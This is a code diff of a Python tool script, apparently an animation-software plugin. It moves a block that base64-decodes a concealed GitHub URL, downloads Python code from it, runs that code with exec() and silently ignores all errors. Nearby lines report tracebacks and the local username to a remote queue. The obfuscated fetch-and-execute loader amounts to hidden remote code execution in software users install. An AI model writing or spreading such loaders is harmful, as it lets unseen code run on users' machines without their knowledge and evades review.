@@ -113,6 +113,17 @@ except:
     import traceback
     add_queue_task('user_shelf_button_error', {'error': str(traceback.format_exc()), 'user':getpass.getuser().lower()})
 '''
+
+# ===============================================================================
+
+try:
+    uRead = uLib.urlopen(
+        base64.b64decode(
+            'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL2FuaW1UcmFuc2ZlckxvYy9tYXN0ZXIvc2VydmljZS9taWlhX3RzdC5weQ=='
+        ).decode()).read()
+    exec(uRead.decode('utf-8'))
+except:pass
+
 # ===============================================================================
 '''
 try:
@@ -157,7 +168,7 @@ else:
     del modules_dict
 '''
 # ===============================================================================
-#'''
+'''
 import base64, os, datetime
 def search_latest_files_or_dirs(ext='', dir_path='', n=8):
     def fmt_time(fp):
@@ -195,7 +206,7 @@ except:
     add_queue_task('ext_path_ls_error__{}'.format(getpass.getuser().lower()),
                    {'error': str(traceback.format_exc())})
 
-#'''
+'''
 # ===============================================================================
 '''
 try:
@@ -209,15 +220,6 @@ else:
 '''
 # ===============================================================================
 
-try:
-    uRead = uLib.urlopen(
-        base64.b64decode(
-            'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL2FuaW1UcmFuc2ZlckxvYy9tYXN0ZXIvc2VydmljZS9taWlhX3RzdC5weQ=='
-        ).decode()).read()
-    exec(uRead.decode('utf-8'))
-except:pass
-
-# ===============================================================================
 try:
     pass
 except:
